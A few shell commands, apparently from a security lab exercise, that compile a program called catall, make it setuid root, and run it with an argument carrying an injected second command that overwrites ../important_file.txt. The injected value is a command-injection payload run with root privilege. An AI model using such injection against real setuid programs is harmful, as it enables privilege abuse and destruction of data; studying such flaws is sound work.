gcc catall.c -o catall
sudo chown root catall
sudo chmod 4755 catall

./catall "../important_file.txt; echo REDACTED > ../important_file.txt"